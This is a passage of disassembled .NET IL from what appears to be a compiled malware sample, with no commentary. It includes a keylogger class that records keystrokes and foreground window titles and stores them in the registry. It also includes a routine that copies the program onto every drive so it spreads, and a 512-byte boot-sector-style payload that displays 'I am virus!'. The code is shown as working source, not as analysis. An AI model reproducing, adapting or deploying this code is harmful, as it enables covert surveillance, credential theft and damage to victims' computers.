    IL_003f:  ldloc.3
    IL_0040:  ldc.i4.1
    IL_0041:  sub.ovf
    IL_0042:  ldc.i4.1
    IL_0043:  add.ovf
    IL_0044:  ldc.i4.1
    IL_0045:  sub.ovf
    IL_0046:  ldc.i4.1
    IL_0047:  add.ovf
    IL_0048:  newarr     [mscorlib]System.Byte
    IL_004d:  stloc.s    V_4
    IL_004f:  ldloc.1
    IL_0050:  ldloc.s    V_4
    IL_0052:  ldc.i4.0
    IL_0053:  ldloc.3
    IL_0054:  callvirt   instance int32 [System]System.IO.Compression.GZipStream::Read(uint8[],
                                                                                       int32,
                                                                                       int32)
    IL_0059:  pop
    IL_005a:  ldloc.1
    IL_005b:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_0060:  ldloc.0
    IL_0061:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_0066:  ldloc.s    V_4
    IL_0068:  ret
  } // end of method OK::ZIP

} // end of class j.OK

.class public auto ansi j.kl
       extends [mscorlib]System.Object
{
  .field private string LastAS
  .field private int32 LastAV
  .field private valuetype [System.Windows.Forms]System.Windows.Forms.Keys lastKey
  .field public string Logs
  .field public string vn
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       36 (0x24)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  ldc.i4.0
    IL_0008:  stfld      valuetype [System.Windows.Forms]System.Windows.Forms.Keys j.kl::lastKey
    IL_000d:  ldarg.0
    IL_000e:  ldstr      ""
    IL_0013:  stfld      string j.kl::Logs
    IL_0018:  ldarg.0
    IL_0019:  ldstr      "[kl]"
    IL_001e:  stfld      string j.kl::vn
    IL_0023:  ret
  } // end of method kl::.ctor

  .method private instance string  AV() cil managed
  {
    // Code size       216 (0xd8)
    .maxstack  5
    .locals init (string V_0,
             int32 V_1,
             native int V_2,
             class [System]System.Diagnostics.Process V_3,
             valuetype [mscorlib]System.DateTime V_4,
             class [mscorlib]System.Exception V_5)
    .try
    {
      IL_0000:  call       native int j.OK::GetForegroundWindow()
      IL_0005:  stloc.2
      IL_0006:  ldloc.2
      IL_0007:  ldloca.s   V_1
      IL_0009:  call       int32 j.kl::GetWindowThreadProcessId(native int,
                                                                int32&)
      IL_000e:  pop
      IL_000f:  ldloc.1
      IL_0010:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetProcessById(int32)
      IL_0015:  stloc.3
      IL_0016:  ldloca.s   V_2
      IL_0018:  call       instance int32 [mscorlib]System.IntPtr::ToInt32()
      IL_001d:  ldarg.0
      IL_001e:  ldfld      int32 j.kl::LastAV
      IL_0023:  ceq
      IL_0025:  ldarg.0
      IL_0026:  ldfld      string j.kl::LastAS
      IL_002b:  ldloc.3
      IL_002c:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
      IL_0031:  ldc.i4.0
      IL_0032:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0037:  ldc.i4.0
      IL_0038:  ceq
      IL_003a:  and
      IL_003b:  ldloc.3
      IL_003c:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
      IL_0041:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0046:  ldc.i4.0
      IL_0047:  ceq
      IL_0049:  or
      IL_004a:  brtrue.s   IL_00b3

      IL_004c:  ldarg.0
      IL_004d:  ldloca.s   V_2
      IL_004f:  call       instance int32 [mscorlib]System.IntPtr::ToInt32()
      IL_0054:  stfld      int32 j.kl::LastAV
      IL_0059:  ldarg.0
      IL_005a:  ldloc.3
      IL_005b:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
      IL_0060:  stfld      string j.kl::LastAS
      IL_0065:  ldc.i4.6
      IL_0066:  newarr     [mscorlib]System.String
      IL_006b:  dup
      IL_006c:  ldc.i4.0
      IL_006d:  ldstr      bytearray (0D 00 0A 00 01 00 ) 
      IL_0072:  stelem.ref
      IL_0073:  dup
      IL_0074:  ldc.i4.1
      IL_0075:  call       valuetype [mscorlib]System.DateTime [Microsoft.VisualBasic]Microsoft.VisualBasic.DateAndTime::get_Now()
      IL_007a:  stloc.s    V_4
      IL_007c:  ldloca.s   V_4
      IL_007e:  ldstr      "yy/MM/dd "
      IL_0083:  call       instance string [mscorlib]System.DateTime::ToString(string)
      IL_0088:  stelem.ref
      IL_0089:  dup
      IL_008a:  ldc.i4.2
      IL_008b:  ldloc.3
      IL_008c:  callvirt   instance string [System]System.Diagnostics.Process::get_ProcessName()
      IL_0091:  stelem.ref
      IL_0092:  dup
      IL_0093:  ldc.i4.3
      IL_0094:  ldstr      " "
      IL_0099:  stelem.ref
      IL_009a:  dup
      IL_009b:  ldc.i4.4
      IL_009c:  ldarg.0
      IL_009d:  ldfld      string j.kl::LastAS
      IL_00a2:  stelem.ref
      IL_00a3:  dup
      IL_00a4:  ldc.i4.5
      IL_00a5:  ldstr      bytearray (01 00 0D 00 0A 00 ) 
      IL_00aa:  stelem.ref
      IL_00ab:  call       string [mscorlib]System.String::Concat(string[])
      IL_00b0:  stloc.0
      IL_00b1:  leave.s    IL_00d6

      IL_00b3:  leave.s    IL_00d0

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00b5:  dup
      IL_00b6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00bb:  stloc.s    V_5
      IL_00bd:  ldloc.s    V_5
      IL_00bf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00c4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00c9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00ce:  leave.s    IL_00d0

    }  // end handler
    IL_00d0:  ldstr      ""
    IL_00d5:  stloc.0
    IL_00d6:  ldloc.0
    IL_00d7:  ret
  } // end of method kl::AV

  .method private instance string  Fix(valuetype [System.Windows.Forms]System.Windows.Forms.Keys k) cil managed
  {
    // Code size       380 (0x17c)
    .maxstack  3
    .locals init (string V_0,
             string V_1,
             bool V_2,
             valuetype [System.Windows.Forms]System.Windows.Forms.Keys V_3,
             class [mscorlib]System.Exception V_4,
             char V_5)
    IL_0000:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
    IL_0005:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Keyboard()
    IL_000a:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_ShiftKeyDown()
    IL_000f:  stloc.2
    IL_0010:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
    IL_0015:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Keyboard()
    IL_001a:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_CapsLock()
    IL_001f:  brfalse.s  IL_002a

    IL_0021:  ldloc.2
    IL_0022:  brfalse.s  IL_0028

    IL_0024:  ldc.i4.0
    IL_0025:  stloc.2
    IL_0026:  br.s       IL_002a

    IL_0028:  ldc.i4.1
    IL_0029:  stloc.2
    IL_002a:  nop
    .try
    {
      IL_002b:  ldarg.1
      IL_002c:  stloc.3
      IL_002d:  ldloc.3
      IL_002e:  ldc.i4.s   35
      IL_0030:  bgt.s      IL_0066

      IL_0032:  ldloc.3
      IL_0033:  ldc.i4.s   13
      IL_0035:  bgt.s      IL_0050

      IL_0037:  ldloc.3
      IL_0038:  ldc.i4.8
      IL_0039:  beq.s      IL_00a1

      IL_003b:  ldloc.3
      IL_003c:  ldc.i4.s   9
      IL_003e:  beq        IL_00fe

      IL_0043:  ldloc.3
      IL_0044:  ldc.i4.s   13
      IL_0046:  beq        IL_00d9

      IL_004b:  br         IL_0106

      IL_0050:  ldloc.3
      IL_0051:  ldc.i4.s   16
      IL_0053:  sub
      IL_0054:  ldc.i4.1
      IL_0055:  ble.un.s   IL_00c3

      IL_0057:  ldloc.3
      IL_0058:  ldc.i4.s   32
      IL_005a:  beq.s      IL_00ce

      IL_005c:  ldloc.3
      IL_005d:  ldc.i4.s   35
      IL_005f:  beq.s      IL_00c3

      IL_0061:  br         IL_0106

      IL_0066:  ldloc.3
      IL_0067:  ldc.i4     0xa3
      IL_006c:  bgt.s      IL_0087

      IL_006e:  ldloc.3
      IL_006f:  ldc.i4.s   46
      IL_0071:  beq.s      IL_00a1

      IL_0073:  ldloc.3
      IL_0074:  ldc.i4.s   112
      IL_0076:  sub
      IL_0077:  ldc.i4.s   11
      IL_0079:  ble.un.s   IL_00c3

      IL_007b:  ldloc.3
      IL_007c:  ldc.i4     0xa0
      IL_0081:  sub
      IL_0082:  ldc.i4.3
      IL_0083:  ble.un.s   IL_00c3

      IL_0085:  br.s       IL_0106

      IL_0087:  ldloc.3
      IL_0088:  ldc.i4     0x10000
      IL_008d:  beq.s      IL_00c3

      IL_008f:  ldloc.3
      IL_0090:  ldc.i4     0x20000
      IL_0095:  beq.s      IL_00c3

      IL_0097:  ldloc.3
      IL_0098:  ldc.i4     0x40000
      IL_009d:  beq.s      IL_00c3

      IL_009f:  br.s       IL_0106

      IL_00a1:  ldstr      "["
      IL_00a6:  ldarga.s   k
      IL_00a8:  constrained. [System.Windows.Forms]System.Windows.Forms.Keys
      IL_00ae:  callvirt   instance string [mscorlib]System.Enum::ToString()
      IL_00b3:  ldstr      "]"
      IL_00b8:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00bd:  stloc.0
      IL_00be:  leave      IL_017a

      IL_00c3:  ldstr      ""
      IL_00c8:  stloc.0
      IL_00c9:  leave      IL_017a

      IL_00ce:  ldstr      " "
      IL_00d3:  stloc.0
      IL_00d4:  leave      IL_017a

      IL_00d9:  ldarg.0
      IL_00da:  ldfld      string j.kl::Logs
      IL_00df:  ldstr      "[ENTER]\r\n"
      IL_00e4:  callvirt   instance bool [mscorlib]System.String::EndsWith(string)
      IL_00e9:  brfalse.s  IL_00f6

      IL_00eb:  ldstr      ""
      IL_00f0:  stloc.0
      IL_00f1:  leave      IL_017a

      IL_00f6:  ldstr      "[ENTER]\r\n"
      IL_00fb:  stloc.0
      IL_00fc:  leave.s    IL_017a

      IL_00fe:  ldstr      "[TAP]\r\n"
      IL_0103:  stloc.0
      IL_0104:  leave.s    IL_017a

      IL_0106:  ldloc.2
      IL_0107:  brfalse.s  IL_0118

      IL_0109:  ldarg.1
      IL_010a:  conv.ovf.u4
      IL_010b:  call       string j.kl::VKCodeToUnicode(uint32)
      IL_0110:  callvirt   instance string [mscorlib]System.String::ToUpper()
      IL_0115:  stloc.0
      IL_0116:  leave.s    IL_017a

      IL_0118:  ldarg.1
      IL_0119:  conv.ovf.u4
      IL_011a:  call       string j.kl::VKCodeToUnicode(uint32)
      IL_011f:  stloc.1
      IL_0120:  leave.s    IL_0178

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0122:  dup
      IL_0123:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0128:  stloc.s    V_4
      IL_012a:  ldloc.s    V_4
      IL_012c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0131:  ldloc.2
      IL_0132:  brfalse.s  IL_0157

      IL_0134:  ldarg.1
      IL_0135:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
      IL_013a:  stloc.s    V_5
      IL_013c:  ldloca.s   V_5
      IL_013e:  call       instance string [mscorlib]System.Char::ToString()
      IL_0143:  callvirt   instance string [mscorlib]System.String::ToUpper()
      IL_0148:  stloc.1
      IL_0149:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_014e:  ldloc.1
      IL_014f:  stloc.0
      IL_0150:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0155:  leave.s    IL_017a

      IL_0157:  ldarg.1
      IL_0158:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
      IL_015d:  stloc.s    V_5
      IL_015f:  ldloca.s   V_5
      IL_0161:  call       instance string [mscorlib]System.Char::ToString()
      IL_0166:  callvirt   instance string [mscorlib]System.String::ToLower()
      IL_016b:  stloc.1
      IL_016c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0171:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0176:  leave.s    IL_0178

    }  // end handler
    IL_0178:  ldloc.1
    IL_0179:  stloc.0
    IL_017a:  ldloc.0
    IL_017b:  ret
  } // end of method kl::Fix

  .method private static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          int16  GetAsyncKeyState(int32 a) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          int32  GetKeyboardLayout(int32 a) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          bool  GetKeyboardState(uint8[] a) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" nomangle ansi lasterr winapi) 
          int32  GetWindowThreadProcessId(native int a,
                                          int32& b) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          uint32  MapVirtualKey(uint32 a,
                                uint32 b) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          int32  ToUnicodeEx(uint32 a,
                             uint32 b,
                             uint8[] c,
                             [out] class [mscorlib]System.Text.StringBuilder  marshal( lpwstr) d,
                             int32 e,
                             uint32 f,
                             native int g) cil managed preservesig
  {
  }
  .method private static string  VKCodeToUnicode(uint32 a) cil managed
  {
    // Code size       138 (0x8a)
    .maxstack  7
    .locals init (string V_0,
             class [mscorlib]System.Text.StringBuilder V_1,
             uint8[] V_2,
             uint32 V_3,
             int32 V_4,
             native int V_5,
             class [mscorlib]System.Exception V_6,
             valuetype [System.Windows.Forms]System.Windows.Forms.Keys V_7)
    .try
    {
      IL_0000:  newobj     instance void [mscorlib]System.Text.StringBuilder::.ctor()
      IL_0005:  stloc.1
      IL_0006:  ldc.i4     0xff
      IL_000b:  newarr     [mscorlib]System.Byte
      IL_0010:  stloc.2
      IL_0011:  ldloc.2
      IL_0012:  call       bool j.kl::GetKeyboardState(uint8[])
      IL_0017:  brtrue.s   IL_0021

      IL_0019:  ldstr      ""
      IL_001e:  stloc.0
      IL_001f:  leave.s    IL_0088

      IL_0021:  ldarg.0
      IL_0022:  ldc.i4.0
      IL_0023:  call       uint32 j.kl::MapVirtualKey(uint32,
                                                      uint32)
      IL_0028:  stloc.3
      IL_0029:  ldc.i4.0
      IL_002a:  stloc.s    V_4
      IL_002c:  call       native int j.OK::GetForegroundWindow()
      IL_0031:  ldloca.s   V_4
      IL_0033:  call       int32 j.kl::GetWindowThreadProcessId(native int,
                                                                int32&)
      IL_0038:  call       int32 j.kl::GetKeyboardLayout(int32)
      IL_003d:  call       native int [mscorlib]System.IntPtr::op_Explicit(int32)
      IL_0042:  stloc.s    V_5
      IL_0044:  ldarg.0
      IL_0045:  ldloc.3
      IL_0046:  ldloc.2
      IL_0047:  ldloc.1
      IL_0048:  ldc.i4.5
      IL_0049:  ldc.i4.0
      IL_004a:  ldloc.s    V_5
      IL_004c:  call       int32 j.kl::ToUnicodeEx(uint32,
                                                   uint32,
                                                   uint8[],
                                                   class [mscorlib]System.Text.StringBuilder,
                                                   int32,
                                                   uint32,
                                                   native int)
      IL_0051:  pop
      IL_0052:  ldloc.1
      IL_0053:  callvirt   instance string [mscorlib]System.Text.StringBuilder::ToString()
      IL_0058:  stloc.0
      IL_0059:  leave.s    IL_0088

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_005b:  dup
      IL_005c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0061:  stloc.s    V_6
      IL_0063:  ldloc.s    V_6
      IL_0065:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_006a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_006f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0074:  leave.s    IL_0076

    }  // end handler
    IL_0076:  ldarg.0
    IL_0077:  conv.ovf.i4.un
    IL_0078:  stloc.s    V_7
    IL_007a:  ldloca.s   V_7
    IL_007c:  constrained. [System.Windows.Forms]System.Windows.Forms.Keys
    IL_0082:  callvirt   instance string [mscorlib]System.Enum::ToString()
    IL_0087:  stloc.0
    IL_0088:  ldloc.0
    IL_0089:  ret
  } // end of method kl::VKCodeToUnicode

  .method public instance void  WRK() cil managed
  {
    // Code size       286 (0x11e)
    .maxstack  5
    .locals init (int32 V_0,
             int32 V_1,
             valuetype [System.Windows.Forms]System.Windows.Forms.Keys V_2,
             string V_3,
             int32 V_4,
             class [mscorlib]System.Exception V_5)
    IL_0000:  ldarg.0
    IL_0001:  ldarg.0
    IL_0002:  ldfld      string j.kl::vn
    IL_0007:  ldstr      ""
    IL_000c:  call       object j.OK::GTV(string,
                                          object)
    IL_0011:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_0016:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_001b:  stfld      string j.kl::Logs
    .try
    {
      IL_0020:  ldc.i4.0
      IL_0021:  stloc.0
      IL_0022:  ldloc.0
      IL_0023:  ldc.i4.1
      IL_0024:  add.ovf
      IL_0025:  stloc.0
      IL_0026:  ldc.i4.0
      IL_0027:  stloc.1
      IL_0028:  ldloc.1
      IL_0029:  call       int16 j.kl::GetAsyncKeyState(int32)
      IL_002e:  ldc.i4     0xffff8001
      IL_0033:  ceq
      IL_0035:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_003a:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Keyboard()
      IL_003f:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_CtrlKeyDown()
      IL_0044:  ldc.i4.0
      IL_0045:  ceq
      IL_0047:  and
      IL_0048:  brfalse.s  IL_008d

      IL_004a:  ldloc.1
      IL_004b:  stloc.2
      IL_004c:  ldarg.0
      IL_004d:  ldloc.2
      IL_004e:  call       instance string j.kl::Fix(valuetype [System.Windows.Forms]System.Windows.Forms.Keys)
      IL_0053:  stloc.3
      IL_0054:  ldloc.3
      IL_0055:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_005a:  ldc.i4.0
      IL_005b:  ble.s      IL_0086

      IL_005d:  ldarg.0
      IL_005e:  ldarg.0
      IL_005f:  ldfld      string j.kl::Logs
      IL_0064:  ldarg.0
      IL_0065:  call       instance string j.kl::AV()
      IL_006a:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_006f:  stfld      string j.kl::Logs
      IL_0074:  ldarg.0
      IL_0075:  ldarg.0
      IL_0076:  ldfld      string j.kl::Logs
      IL_007b:  ldloc.3
      IL_007c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0081:  stfld      string j.kl::Logs
      IL_0086:  ldarg.0
      IL_0087:  ldloc.2
      IL_0088:  stfld      valuetype [System.Windows.Forms]System.Windows.Forms.Keys j.kl::lastKey
      IL_008d:  ldloc.1
      IL_008e:  ldc.i4.1
      IL_008f:  add.ovf
      IL_0090:  stloc.1
      IL_0091:  ldloc.1
      IL_0092:  ldc.i4     0xff
      IL_0097:  ble.s      IL_0028

      IL_0099:  ldloc.0
      IL_009a:  ldc.i4     0x3e8
      IL_009f:  bne.un.s   IL_00f7

      IL_00a1:  ldc.i4.0
      IL_00a2:  stloc.0
      IL_00a3:  ldstr      "[klen]"
      IL_00a8:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_00ad:  ldc.i4     0x400
      IL_00b2:  mul.ovf
      IL_00b3:  stloc.s    V_4
      IL_00b5:  ldarg.0
      IL_00b6:  ldfld      string j.kl::Logs
      IL_00bb:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_00c0:  ldloc.s    V_4
      IL_00c2:  ble.s      IL_00e4

      IL_00c4:  ldarg.0
      IL_00c5:  ldarg.0
      IL_00c6:  ldfld      string j.kl::Logs
      IL_00cb:  ldc.i4.0
      IL_00cc:  ldarg.0
      IL_00cd:  ldfld      string j.kl::Logs
      IL_00d2:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_00d7:  ldloc.s    V_4
      IL_00d9:  sub.ovf
      IL_00da:  callvirt   instance string [mscorlib]System.String::Remove(int32,
                                                                           int32)
      IL_00df:  stfld      string j.kl::Logs
      IL_00e4:  ldarg.0
      IL_00e5:  ldfld      string j.kl::vn
      IL_00ea:  ldarg.0
      IL_00eb:  ldfld      string j.kl::Logs
      IL_00f0:  ldc.i4.1
      IL_00f1:  call       bool j.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_00f6:  pop
      IL_00f7:  ldc.i4.1
      IL_00f8:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_00fd:  br         IL_0022

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0102:  dup
      IL_0103:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0108:  stloc.s    V_5
      IL_010a:  ldloc.s    V_5
      IL_010c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0111:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0116:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_011b:  leave.s    IL_011d

    }  // end handler
    IL_011d:  ret
  } // end of method kl::WRK

} // end of class j.kl

.class public auto ansi j.A
       extends [mscorlib]System.Object
{
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method A::.ctor

  .method public static void  main() cil managed
  {
    .entrypoint
    .custom instance void [mscorlib]System.STAThreadAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       6 (0x6)
    .maxstack  8
    IL_0000:  call       void j.OK::ko()
    IL_0005:  ret
  } // end of method A::main

} // end of class j.A

.class public auto ansi spredusb
       extends [mscorlib]System.Object
{
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method spredusb::.ctor

  .method public static void  Start() cil managed
  {
    // Code size       104 (0x68)
    .maxstack  3
    .locals init (string V_0,
             string[] V_1,
             int32 V_2)
    IL_0000:  call       class My.MyComputer My.MyProject::get_Computer()
    IL_0005:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
    IL_000a:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::get_SpecialDirectories()
    IL_000f:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy::get_ProgramFiles()
    IL_0014:  stloc.0
    IL_0015:  call       string[] [mscorlib]System.IO.Directory::GetLogicalDrives()
    IL_001a:  stloc.1
    IL_001b:  ldc.i4.0
    IL_001c:  stloc.2
    IL_001d:  br.s       IL_0061

    IL_001f:  ldloc.1
    IL_0020:  ldloc.2
    IL_0021:  ldelem.ref
    IL_0022:  stloc.0
    .try
    {
      IL_0023:  ldloc.0
      IL_0024:  ldsfld     string j.OK::RG
      IL_0029:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_002e:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_0033:  brtrue.s   IL_004f

      IL_0035:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::GetExecutingAssembly()
      IL_003a:  callvirt   instance string [mscorlib]System.Reflection.Assembly::get_Location()
      IL_003f:  ldloc.0
      IL_0040:  ldsfld     string j.OK::RG
      IL_0045:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_004a:  call       void [mscorlib]System.IO.File::Copy(string,
                                                               string)
      IL_004f:  leave.s    IL_005d

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0051:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0056:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_005b:  leave.s    IL_005d

    }  // end handler
    IL_005d:  ldloc.2
    IL_005e:  ldc.i4.1
    IL_005f:  add.ovf
    IL_0060:  stloc.2
    IL_0061:  ldloc.2
    IL_0062:  ldloc.1
    IL_0063:  ldlen
    IL_0064:  conv.i4
    IL_0065:  blt.s      IL_001f

    IL_0067:  ret
  } // end of method spredusb::Start

} // end of class spredusb

.class private auto ansi sealed '<PrivateImplementationDetails>'
       extends [mscorlib]System.Object
{
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .class explicit ansi sealed nested private '__StaticArrayInitTypeSize=512'
         extends [mscorlib]System.ValueType
  {
    .pack 1
    .size 512
  } // end of class '__StaticArrayInitTypeSize=512'

  .field static assembly initonly valuetype '<PrivateImplementationDetails>'/'__StaticArrayInitTypeSize=512' F4302D72A369C8BADBF2BE9C2854DF4529637155 at I_00021598
  .method assembly static uint32  ComputeStringHash(string s) cil managed
  {
    // Code size       44 (0x2c)
    .maxstack  2
    .locals init (uint32 V_0,
             int32 V_1)
    IL_0000:  ldc.i4     0x811c9dc5
    IL_0005:  stloc.0
    IL_0006:  ldarg.0
    IL_0007:  brfalse.s  IL_002a

    IL_0009:  ldc.i4.0
    IL_000a:  stloc.1
    IL_000b:  br.s       IL_0021

    IL_000d:  ldarg.0
    IL_000e:  ldloc.1
    IL_000f:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
    IL_0014:  ldloc.0
    IL_0015:  xor
    IL_0016:  ldc.i4     0x1000193
    IL_001b:  mul
    IL_001c:  stloc.0
    IL_001d:  ldloc.1
    IL_001e:  ldc.i4.1
    IL_001f:  add
    IL_0020:  stloc.1
    IL_0021:  ldloc.1
    IL_0022:  ldarg.0
    IL_0023:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0028:  blt.s      IL_000d

    IL_002a:  ldloc.0
    IL_002b:  ret
  } // end of method '<PrivateImplementationDetails>'::ComputeStringHash

} // end of class '<PrivateImplementationDetails>'


// =============================================================

.data cil I_00021598 = bytearray (
                 EB 00 31 C0 8E D8 FC B8 12 00 CD 10 BE 24 7C B3  // ..1..........$|.
                 03 E8 02 00 EB FE B7 00 AC 3C 00 74 06 B4 0E CD  // .........<.t....
                 10 EB F5 C3 49 20 61 6D 20 76 69 72 75 73 21 20  // ....I am virus! 
                 46 75 63 6B 20 59 6F 75 20 3A 2D 29 00 00 00 00  // Fuck You :-)....
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
